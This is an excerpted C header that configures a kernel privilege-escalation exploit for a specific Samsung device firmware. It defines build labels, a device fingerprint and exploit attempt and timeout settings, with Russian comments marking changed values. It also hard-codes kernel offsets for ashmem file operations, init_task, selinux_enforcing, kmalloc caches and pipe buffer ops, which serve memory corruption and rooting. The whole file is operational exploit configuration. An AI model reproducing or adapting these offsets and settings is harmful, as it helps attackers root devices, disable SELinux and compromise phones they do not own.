...
#define BUILD_VARIANT_LABEL \
  "r12s-S721BXXSCDZF3-app-production-slide8-fops8"   // ✅ изменено
...
#else
#define BUILD_VARIANT_LABEL "r12s-S721BXXSCDZF3-root-umh"   // ✅ изменено
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/r12sxins/r12s:16/BP4A.251205.006/S721BXXSDDZG1:user/release-keys"   // ✅ изменено
#endif
...
#define APP_FOPS_MIN_OBJECT_INDEX 12   // ✅ изменено (было 24)
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL   // совпадает
...
#define DEFAULT_EXPLOIT_ATTEMPTS 24   // ✅ изменено (было 1)
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 120   // ✅ изменено (было 2200)
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 45   // ✅ изменено (было 1200)
...
#define P0_FINGERPRINT_HEADER \
  "targets/r12s-S721BXXSCDZF3/p0_fingerprint.h"   // ✅ изменено (путь)
#endif
...
#define ASHMEM_MISC_FOPS_OFF 0x02484970ULL   // ✅ изменено
#define ASHMEM_FOPS_OFF 0x013d9d08ULL        // ✅ изменено
#define ASHMEM_IOCTL_OFF 0x00d37cf8ULL       // ✅ изменено
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d38630ULL // ✅ изменено
#define ASHMEM_MMAP_OFF 0x00d38688ULL        // ✅ изменено
#define ASHMEM_OPEN_OFF 0x00d388b4ULL        // ✅ изменено
#define ASHMEM_RELEASE_OFF 0x00d3893cULL     // ✅ изменено
#define ASHMEM_SHOW_FDINFO_OFF 0x00d38a5cULL // ✅ изменено
...
#define INIT_TASK_OFF 0x022ff800ULL          // совпадает
#define ROOT_TASK_GROUP_OFF 0x02515cc0ULL    // совпадает
#define SELINUX_ENFORCING_OFF 0x025ea478ULL
#define KMALLOC_CACHES_OFF 0x017a79d8ULL     // ✅ изменено
#define ANON_PIPE_BUF_OPS_OFF 0x0121db90ULL  // ✅ изменено
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016dd06fULL   // ✅ изменено
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022f2a08ULL // совпадает
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0243ef78ULL // совпадает
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x026d1b60ULL       // совпадает
